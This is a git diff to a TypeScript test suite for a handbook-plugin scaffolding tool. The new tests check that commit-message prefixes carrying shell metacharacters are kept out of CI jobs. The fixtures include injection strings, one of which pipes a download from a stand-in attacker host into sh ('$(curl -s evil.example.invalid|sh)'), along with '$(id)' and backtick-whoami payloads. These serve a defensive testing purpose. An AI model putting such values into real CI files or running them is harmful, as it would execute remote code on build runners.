@@ -3,7 +3,7 @@ import { execFileSync } from "node:child_process";
 import { mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
-import { README_BEGIN, README_END, runGit, saveTeamConfig, skeletonFiles, TEAM_PREFIX_FILE } from "./init.js";
+import { hostFromUrl, README_BEGIN, README_END, runGit, saveTeamConfig, skeletonFiles, TEAM_PREFIX_FILE } from "./init.js";
 import type { GitRunner, TeamConfig } from "./init.js";
 import { productVersion } from "./plugin-root.js";
 import { createGitLabRepo } from "./gitlab-fixture.js";
@@ -138,6 +138,49 @@ function joinerFor(remote: string): TeamConfig {
 function currentHandbookRepo(): string {
   return handbookRepo((remote) => ({ ...currentScaffold(teamFor(remote)), ...TEAM_CONTENT }));
 }
+
+/** The version-bump job as releases before the prefix moved into a variable wrote it, for a team whose prefix is TEAM-1. */
+const OLD_GITLAB_CI = `# Bumps the plugin version on every merge to the default branch. The version string is
+# Claude Code's update signal: without a bump, teammates keep serving the cached copy.
+# Requires a project access token with write_repository scope stored in the
+# TEAMHANDBOOK_CI_TOKEN CI/CD variable (Settings > CI/CD > Variables).
+version-bump:
+  image: node:22
+  rules:
+    # only run when the CI token exists - otherwise skip (don't fail the pipeline)
+    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH && $CI_COMMIT_MESSAGE !~ /^TEAM-1 ci: bump plugin version/ && $TEAMHANDBOOK_CI_TOKEN'
+  script:
+    - node scripts/bump-version.mjs
+    - git config user.name "handbook-ci"
+    - git config user.email "handbook-ci@noreply.invalid"
+    - git commit -am "TEAM-1 ci: bump plugin version"
+`;
+
+const OLD_GITHUB_WORKFLOW = `name: version-bump
+
+# Bumps the plugin version on every merge to main. The version string is Claude Code's
+# update signal: without a bump, teammates keep serving the cached marketplace copy.
+on:
+  push:
+    branches: [main]
+
+jobs:
+  bump:
+    if: "!startsWith(github.event.head_commit.message, 'TEAM-1 ci: bump plugin version')"
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: node scripts/bump-version.mjs
+      - run: |
+          git config user.name "handbook-ci"
+          git config user.email "handbook-ci@users.noreply.github.com"
+          git commit -am "TEAM-1 ci: bump plugin version"
+`;
 
 /** Real git for everything the flow actually does, with a fixed identity so the commit
  * author does not depend on whoever runs the suite. */
@@ -1006,9 +1049,9 @@ describe("switching a repository to versioning by commit", () => {
     const text = formatUpgradePlan(plan);
     expect(text).toContain("This request switches the repository to versioning by commit");
     expect(text).toContain("Open requests that raise the version conflict with this commit");
-    expect(text).toContain("/plugin marketplace update acme-skills");
+    expect(text).toContain("claude plugin update acme-skills@acme-skills");
     expect(text).toContain("/reload-plugins");
-    expect(text).toContain("update to 0.31.0 or later first (`/plugin marketplace update\nteamhandbook`, then `/reload-plugins`)");
+    expect(text).toContain("update to 0.31.0 or later first (`claude plugin update\nhandbook@teamhandbook`, then a new session or `/reload-plugins`)");
     // the record line names the copies it stops, which agrees with the sentence above it
     const flat = text.replace(/\n/g, " ");
     expect(flat).toContain("so an older copy at 0.29.0 or later refuses to refresh it back; one older than 0.29.0 does not read the record.");
@@ -1342,7 +1385,7 @@ describe("scaffoldVersionProblem", () => {
     const problem = scaffoldVersionProblem("9.9.9", "0.27.0");
 
     expect(problem).toContain("last written by TeamHandbook 9.9.9, and this copy is 0.27.0");
-    expect(problem).toContain("`/plugin marketplace update teamhandbook` and then `/reload-plugins`");
+    expect(problem).toContain("`claude plugin update handbook@teamhandbook`, then start a new session or run `/reload-plugins`");
     expect(problem).not.toContain("by hand");
   });
 
@@ -1386,7 +1429,7 @@ describe("the release that wrote the scaffold", () => {
     const plan = planUpgrade(teamFor(remote, { commitPrefix: "TEAM-1" }), gitWithIdentity, noForge);
 
     expect(plan.ok).toBe(false);
-    expect(plan.error).toContain("/plugin marketplace update teamhandbook");
+    expect(plan.error).toContain("claude plugin update handbook@teamhandbook");
     expect(plan.files).toBeUndefined();
   });
 
@@ -1560,7 +1603,7 @@ describe("the refresh commit's prefix and the record's", () => {
     for (const prefix of ["TE`whoami`AM", 'TE"AM', "TE$(id)AM", "TE\\AM", "TE!AM", "TEAM-1!"]) {
       const plan = planUpgrade(joinerFor(currentHandbookRepo()), watching, noForge, { commitPrefix: prefix });
       expect(plan.error, prefix).toBe(
-        "that commit-message prefix cannot be used: it is carrying a quote, a backtick, a dollar sign, a backslash or an exclamation mark. Nothing was changed.",
+        "that commit-message prefix cannot be used: it is carrying a character other than letters, digits, spaces and . , : / [ ] ( ) _ -. Nothing was changed.",
       );
     }
     expect(cloned).toEqual([]);
@@ -1591,6 +1634,94 @@ describe("the refresh commit's prefix and the record's", () => {
 
     expect(candidates.withheld).toEqual([]);
     expect(JSON.parse(candidates.files[TEAM_PREFIX_FILE]!).commitPrefix).toBe("TEAM-1");
+  });
+
+  it("given a CI repository whose team file records a prefix that would run a command, when the refresh is built where nothing else knows the prefix, then neither the CI job nor the team file is offered and no candidate carries it", () => {
+    // given
+    const repoDir = temp("handbook-repo-");
+    const files = currentScaffold(teamFor("git@gitlab.acme.com:team/skills.git"), true);
+    const recorded = { ...JSON.parse(files[TEAM_PREFIX_FILE]!), commitPrefix: 'VAN-7 $(curl -s evil.example.invalid|sh)" && echo "' };
+    writeAll(repoDir, { ...files, [TEAM_PREFIX_FILE]: JSON.stringify(recorded, null, 2) + "\n" });
+
+    // when
+    const candidates = upgradeCandidates(repoDir, { repoUrl: "git@gitlab.acme.com:team/skills.git", marketplaceName: "acme-skills" });
+
+    // then
+    expect(candidates.files[".gitlab-ci.yml"]).toBeUndefined();
+    expect(candidates.files[TEAM_PREFIX_FILE]).toBeUndefined();
+    expect(candidates.withheld.map((file) => file.path).sort()).toEqual([".gitlab-ci.yml", TEAM_PREFIX_FILE]);
+    expect(JSON.stringify(candidates)).not.toContain("curl");
+  });
+
+  it("given the old CI job carrying a recorded prefix that would run a command, when the refresh is built where nothing else knows the prefix, then the job is withheld with the true reason and the way out", () => {
+    // given
+    const repoDir = temp("handbook-repo-");
+    const files = currentScaffold(teamFor("git@gitlab.acme.com:team/skills.git"), true);
+    const bad = 'VAN-7 $(curl -s evil.example.invalid|sh)" && echo "';
+    const recorded = { ...JSON.parse(files[TEAM_PREFIX_FILE]!), commitPrefix: bad };
+    writeAll(repoDir, { ...files, [TEAM_PREFIX_FILE]: JSON.stringify(recorded, null, 2) + "\n", ".gitlab-ci.yml": OLD_GITLAB_CI.replaceAll("TEAM-1", bad) });
+
+    // when
+    const candidates = upgradeCandidates(repoDir, { repoUrl: "git@gitlab.acme.com:team/skills.git", marketplaceName: "acme-skills" });
+
+    // then
+    const reason = candidates.withheld.find((file) => file.path === ".gitlab-ci.yml")?.reason ?? "";
+    expect(reason).toContain(`the one ${TEAM_PREFIX_FILE} records is carrying a character other than letters, digits, spaces`);
+    expect(reason).toContain("carries that prefix in a shell line it runs on every merge");
+    expect(reason).toContain('--commit-prefix "<prefix>"');
+    expect(reason).not.toContain("neither this machine nor the repository");
+    expect(JSON.stringify(candidates)).not.toContain("curl");
+  });
+
+  it.each([
+    ["GitLab", "git@gitlab.acme.com:team/skills.git", ".gitlab-ci.yml", OLD_GITLAB_CI],
+    ["GitHub", "https://github.com/acme/skills.git", ".github/workflows/version-bump.yml", OLD_GITHUB_WORKFLOW],
+  ])("given a %s repository running the CI job written before the prefix moved into a variable, when the scaffold is refreshed, then the job is offered in the new shape with the recorded prefix only in BUMP_MESSAGE", (_forge, remote, path, old) => {
+    // given
+    const repoDir = temp("handbook-repo-");
+    const team = teamFor(remote, { commitPrefix: "TEAM-1" });
+    const files = skeletonFiles(team.marketplaceName, team.repoUrl, hostFromUrl(team.repoUrl), "TEAM-1", true);
+    writeAll(repoDir, { ...files, [path]: old });
+
+    // when
+    const candidates = upgradeCandidates(repoDir, team);
+
+    // then
+    expect(candidates.withheld).toEqual([]);
+    expect(candidates.files[path]).toBe(files[path]);
+    expect(candidates.files[path]!.split("\n").filter((line) => line.includes("TEAM-1")).map((line) => line.trim())).toEqual(['BUMP_MESSAGE: "TEAM-1 ci: bump plugin version"']);
+  });
+
+  it("given a CI repository recording PAY, when the refresh is given a new prefix, then the team file and the CI job carry the new one in the same set of files", () => {
+    // given
+    const repoDir = temp("handbook-repo-");
+    const team = teamFor("git@gitlab.acme.com:team/skills.git", { commitPrefix: "PAY" });
+    writeAll(repoDir, skeletonFiles(team.marketplaceName, team.repoUrl, hostFromUrl(team.repoUrl), "PAY", true));
+
+    // when
+    const candidates = upgradeCandidates(repoDir, team, undefined, {}, "CORE");
+
+    // then
+    expect(candidates.withheld).toEqual([]);
+    expect(candidates.files[".gitlab-ci.yml"]).toContain('BUMP_MESSAGE: "CORE ci: bump plugin version"');
+    expect(JSON.parse(candidates.files[TEAM_PREFIX_FILE]!).commitPrefix).toBe("CORE");
+  });
+
+  it("given a prefix this machine's config kept from before the rule narrowed, when the refresh is built, then the CI job is withheld and says why instead of carrying it", () => {
+    // given
+    const repoDir = temp("handbook-repo-");
+    const files = currentScaffold(teamFor("git@gitlab.acme.com:team/skills.git"), true);
+    const { commitPrefix: _absent, ...unrecorded } = JSON.parse(files[TEAM_PREFIX_FILE]!);
+    writeAll(repoDir, { ...files, [TEAM_PREFIX_FILE]: JSON.stringify(unrecorded, null, 2) + "\n" });
+
+    // when
+    const candidates = upgradeCandidates(repoDir, teamFor("git@gitlab.acme.com:team/skills.git", { commitPrefix: "TE$(id)AM" }));
+
+    // then
+    expect(candidates.files[".gitlab-ci.yml"]).toBeUndefined();
+    const reason = candidates.withheld.find((file) => file.path === ".gitlab-ci.yml")?.reason;
+    expect(reason).toContain("the one this machine has is carrying a character other than letters, digits, spaces");
+    expect(reason).not.toContain("$(id)");
   });
 });
 
